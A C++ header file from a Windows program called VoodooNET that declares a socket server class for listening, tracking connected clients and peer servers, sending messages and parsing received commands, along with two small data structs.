/*
 *  VoodooNET - a modular multi-threaded program for Windows x86/x64 bit
 *	Coded by VoRTeCKZ - @therealvorteckz
 *  VoRTeCKZ Studios
 *
 *	Copyright (C) 2023 - All Rights Reserved.
 *
 * Permission to ("use, copy, and/or modify") this software for
 * any purpose  with or without fee is hereby granted, provided that the above copyright
 * notice and this permission notice appear in all copies.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED,
 * INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR
 * PURPOSE AND NONINFRINGEMENT OF THIRD PARTY RIGHTS. IN NO EVENT SHALL THE AUTHORS OR
 * COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN
 * ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
 * SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 *
 */

#pragma once
#ifndef __CSERVER_h__
#define __CSERVER_h__
//int m_iClientNum = 0;
#define MAX_CLIENTS 255


class cServer : public cCommandHandler
{
public:
	cServer();
	~cServer();
	virtual bool HandleCommand(char* cmd, char* params, ...);

	
	fd_set master;
	void Init();
	void cServerListen(int m_cSocket, int port, ...);
	void SendToClients(const char *msg, ...);
	bool b_cCheckRunning();
	int b_cGetSocket();
	void Listen();
	bool ParseReceived(char* data);
	void GetReceived(char* data);
	//void Allocate();
	void AddClient(char* host,char *name, int port, int cSocket);
	void AddServer(char* host, char* s_Name, int port, int cSocket);

	void p2pList(int socket);
	void ClearClients();
	void printline();
	void Cleanup(); 
	int CalculateClients();
	char* CreateName();

	void SplitRecv(char* szLine);
	bool ParseRecv(char* szLine);
	int RawSend(int socket, const char* data, ...);
	int m_iClientNum = 0;
	int m_sServerNum = 0;
	int m_sListenSock = 0;
	int socketCount = 0;
	int outSock = 0;
	int client = 0;
	int get_socket = 0;
	bool b_cRunning = FALSE;

protected:
	int m_sServerSock = 0;
};

//DWORD WINAPI ServerDaemonThread(LPVOID param);

typedef struct
{
	char* name;
	char* host;
	int port;
	int clientcount;
	int socket;
	int server;

}CLIENTS;

typedef struct
{
	char* nickname;
}nicksock;

#endif